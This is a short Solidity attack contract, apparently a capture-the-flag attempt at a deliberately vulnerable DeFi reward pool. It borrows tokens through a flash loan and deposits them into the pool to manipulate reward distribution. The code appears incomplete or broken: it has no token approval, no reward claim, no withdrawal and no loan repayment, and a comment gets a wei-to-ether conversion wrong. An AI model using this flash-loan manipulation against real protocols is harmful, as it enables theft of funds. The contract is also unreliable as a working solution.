// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { RewardToken } from "./RewardToken.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";

contract att 
{

    TheRewarderPool public rw;
    RewardToken rt;
    constructor(TheRewarderPool rwpool, FlashLoanerPool fl)
    {
        rw = rwpool;
        rt = rw.rewardToken();
        fl.flashLoan(10000 ether);
    }
    
    function receiveFlashLoan(uint256 amount ) public 
    {
        //10000000000000000000000000 wei 10k ETH
        //now the contract owns 'amount' no of coins in DVT
        rw.deposit(1);
        rw.deposit(9000 ether);
    }

    fallback() external payable 
    {
        
    }
}